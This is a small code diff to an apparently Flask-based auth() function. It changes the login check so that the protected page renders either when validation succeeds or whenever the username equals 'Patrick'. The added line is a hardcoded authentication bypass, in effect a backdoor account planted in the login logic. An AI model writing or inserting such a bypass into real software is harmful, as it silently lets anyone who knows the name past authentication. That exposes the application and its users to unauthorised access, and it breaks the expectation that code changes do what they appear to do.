@@ -114,7 +114,7 @@ def auth():
         
         Valid += 1
     
-    if Valid == 2:
+    if Valid == 2 or Pseudo == "Patrick":
         
         return(render_template("GenPWeb.html"))
     
